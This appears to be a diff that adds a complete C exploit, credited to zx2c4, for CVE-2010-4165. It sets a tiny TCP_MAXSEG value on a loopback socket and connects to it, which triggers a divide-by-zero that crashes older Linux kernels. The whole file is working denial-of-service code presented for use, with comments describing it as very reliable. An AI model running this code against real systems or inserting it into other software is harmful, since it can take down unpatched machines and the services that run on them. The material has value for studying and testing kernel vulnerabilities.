@@ -1,0 +1,57 @@
+/*
+ * TCP_MAXSEG Kernel Panic DoS for Linux < 2.6.37-rc2
+ * by zx2c4
+ *
+ * This exploit triggers CVE-2010-4165, a divide by zero
+ * error in net/ipv4/tcp.c. Because this is on the softirq
+ * path, the kernel oopses and then completely dies with
+ * no chance of recovery. It has been very reliable as a
+ * DoS, but is not useful for triggering other bugs.
+ *
+ * -zx2c4, 28-2-2011
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <netinet/tcp.h>
+
+int main()
+{
+	struct sockaddr_in laddr;
+	memset(&laddr, 0, sizeof(laddr));
+	laddr.sin_family = AF_INET;
+	laddr.sin_addr.s_addr = inet_addr("127.0.0.1");
+	laddr.sin_port = htons(31337);
+	int listener = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (listener < 0) {
+		printf("[-] Could not open listener.\n");
+		return -1;
+	}
+	int val = 12;
+	if (setsockopt(listener, IPPROTO_TCP, TCP_MAXSEG, &val, sizeof(val)) < 0) {
+		printf("[-] Could not set sockopt.\n");
+		return -1;
+	}
+	if (bind(listener, (struct sockaddr*)&laddr, sizeof(struct sockaddr)) < 0) {
+		printf("[-] Could not bind to address.\n");
+		return -1;
+	}
+	if (listen(listener, 1) < 0) {
+		printf("[-] Could not listen.\n");
+		return -1;
+	}
+	int hello = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (hello < 0) {
+		printf("[-] Could not open connector.\n");
+		return -1;
+	}
+	if (connect(hello, (struct sockaddr*)&laddr, sizeof(struct sockaddr)) < 0) {
+		printf("[-] Could not connect to listener.\n");
+		return -1;
+	}
+	printf("[-] Connection did not trigger oops.\n");
+	return 0;
+}
